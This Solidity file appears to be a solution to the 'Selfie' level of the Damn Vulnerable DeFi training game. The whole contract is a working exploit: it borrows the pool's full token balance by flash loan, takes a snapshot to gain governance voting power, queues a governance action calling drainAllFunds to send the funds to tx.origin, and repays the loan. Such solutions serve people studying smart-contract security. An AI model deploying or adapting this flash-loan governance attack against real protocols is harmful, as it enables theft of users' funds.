// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


import "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";

/**
 * @title SelfieDrainer
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SelfieDrainer {
	SelfiePool sp;
	DamnValuableTokenSnapshot token;
	SimpleGovernance sg;
	uint256 public actionId;

	constructor(address selfieAddress) {
		sp = SelfiePool(selfieAddress);
		token = DamnValuableTokenSnapshot(address(sp.token()));
		sg = SimpleGovernance(sp.governance());
	}

	function drainExploit() external {
		sp.flashLoan(token.balanceOf(address(sp)));
	}

	function receiveTokens(address tokenAddress, uint256 amount) external {
		token.snapshot();
		actionId = sg.queueAction(address(sp), abi.encodeWithSignature(
                "drainAllFunds(address)",
                address(tx.origin)
            ), 0);
		token.transfer(address(sp), token.balanceOf(address(this)));
	}
}